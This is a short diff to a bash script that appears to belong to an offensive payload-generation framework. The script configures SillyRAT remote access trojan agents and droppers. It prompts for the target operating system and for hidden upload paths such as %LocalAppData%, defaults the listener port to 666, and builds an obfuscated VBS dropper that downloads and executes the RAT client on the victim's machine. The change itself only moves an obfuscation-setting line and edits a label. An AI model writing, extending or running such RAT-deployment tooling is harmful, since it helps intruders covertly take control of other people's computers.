@@ -10268,6 +10268,7 @@ if ! [ -e "$IPATH/bin/SillyRAT/venomconf" ]; then
    cd $IPATH
 fi
 
+
 # -------------------------------------------------------
 
 
@@ -10278,6 +10279,7 @@ Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: St
 SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
 if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
+easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="666";fi
@@ -10302,7 +10304,7 @@ else # Mac or multi-platforms
    lolbin="Direct Download (url)"
    targetos="Multi-Platforms"
    uploadpath="NULL (Client manual execution)"
-   dropperpath="NULL (pure python Client)"
+   dropperpath="NULL (pure python Client exec)"
 fi
 
 
@@ -10327,7 +10329,6 @@ if [ "$SOSP" = "Windows" ]; then
    ## BUILD DROPPER (Install python3/Download/Execute Client.py)
    # Remark: Its mandatory the install of python3/pip3 SillyRAT rat
    # requirements in target system before executing the Client.py remote.
-   easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
    if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
       ## Build dropper.vbs (IF: OBFUSCATION=ON | IF: categorie nº8 - Agent nº6)
       echo "${BlueF}[☠]${white} Creating dropper VBS Program."${Reset};sleep 2
